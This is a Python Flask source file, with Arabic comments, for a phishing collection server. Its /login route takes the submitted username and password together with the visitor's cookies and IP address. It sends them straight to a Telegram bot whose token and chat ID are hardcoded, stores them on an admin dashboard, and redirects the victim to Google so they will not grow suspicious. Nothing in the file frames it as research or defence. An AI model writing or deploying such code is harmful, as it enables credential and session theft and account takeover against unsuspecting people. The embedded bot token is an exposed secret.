import os
import requests
from flask import Flask, render_template, request, redirect, make_response
import json
from datetime import datetime

app = Flask(__name__)

# جلب الإعدادات تلقائياً من ملف render.yaml
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "1367401179")

# مخازن البيانات المؤقتة (سيتم عرضها في dashboard.html)
captured_creds = {}
captured_sessions = {}

def send_to_telegram(message):
    """إرسال التقارير والبيانات فوراً إلى التليجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error sending to TG: {e}")

@app.route('/')
def home():
    """عرض لوحة التحكم الرئيسية"""
    return render_template('dashboard.html', 
                           creds=captured_creds, 
                           sessions=captured_sessions)

@app.route('/login', methods=['POST'])
def capture():
    """النقطة البرمجية المسؤولة عن الصيد (البيانات + الكوكيز)"""
    # 1. استخراج البيانات من الفورم
    site_name = request.form.get('site', 'Unknown Site')
    email = request.form.get('email') or request.form.get('username')
    password = request.form.get('password')
    
    # 2. التقاط الكوكيز من المتصفح
    cookies = request.cookies.to_dict()
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # 3. تجهيز تقرير التليجرام (بتركيز عالي على الكوكيز كما طلبت)
    tg_message = (
        f"🎯 **صيد جديد من: {site_name}**\n"
        f"👤 **المستخدم:** `{email}`\n"
        f"🔑 **الباسورد:** `{password}`\n"
        f"🌐 **IP:** `{ip_addr}`\n"
        f"⏰ **الوقت:** {timestamp}\n\n"
        f"🍪 **ملفات تعريف الارتباط (Cookies):**\n"
        f"```json\n{json.dumps(cookies, indent=2)}\n```"
    )
    
    # إرسال التقرير فوراً
    send_to_telegram(tg_message)

    # 4. تخزين البيانات محلياً لعرضها في الـ Dashboard
    capture_id = str(len(captured_creds) + 1)
    captured_creds[capture_id] = {
        "site": site_name,
        "credentials": {"user": email, "pass": password},
        "ip": ip_addr,
        "timestamp": timestamp
    }
    
    # تخزين الجلسة (Cookies) بشكل منفصل لتظهر في قسم الجلسات
    captured_sessions[capture_id] = {
        "site": site_name,
        "cookies": cookies,
        "ip": ip_addr,
        "timestamp": timestamp
    }

    # 5. إعادة التوجيه للموقع الحقيقي لإبعاد الشبهة
    return redirect("https://www.google.com")

@app.route('/admin/clear')
def clear_all():
    """مسح كافة البيانات من اللوحة"""
    captured_creds.clear()
    captured_sessions.clear()
    return redirect('/')

@app.route('/admin/session/<id>')
def view_session(id):
    """عرض تفاصيل الكوكيز لجلسة محددة"""
    session = captured_sessions.get(id)
    if session:
        return f"<h3>Cookies for Session {id}:</h3><pre>{json.dumps(session['cookies'], indent=2)}</pre>"
    return "Session not found", 404

if __name__ == '__main__':
    # التشغيل على المنفذ الذي يطلبه Render
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
